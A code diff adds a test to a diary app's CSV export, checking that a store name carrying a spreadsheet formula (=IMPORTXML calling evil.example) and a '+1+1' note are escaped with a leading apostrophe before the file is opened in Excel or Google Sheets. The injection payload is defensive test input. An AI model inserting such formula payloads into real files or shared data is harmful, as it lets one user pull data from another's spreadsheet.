@@ -85,6 +85,19 @@ describe('diary export (ТЗ §14)', () => {
     expect(parsed.entries[0].isSameBottleRepeat).toBe(true)
   })
 
+  test('обезвреживает формулу, приехавшую из общего справочника магазинов', () => {
+    // Название магазина вводит другой пользователь, а выгрузку открывают в Excel или
+    // Google Sheets — без защиты один человек прислал бы формулу в файл другого.
+    const csv = buildCsvExport({
+      entries: [entry({ storeName: '=IMPORTXML("http://evil.example","//a")', notes: '+1+1' })],
+      locale: 'ru',
+    })
+
+    expect(csv).toContain(`"'=IMPORTXML(""http://evil.example"",""//a"")"`)
+    expect(csv).toContain("'+1+1")
+    expect(csv).not.toContain(',=IMPORTXML')
+  })
+
   test('пустой дневник выгружается без строк, но с заголовком и структурой', () => {
     expect(buildCsvExport({ entries: [], locale: 'ru' }).split('\r\n')).toHaveLength(1)
     expect(
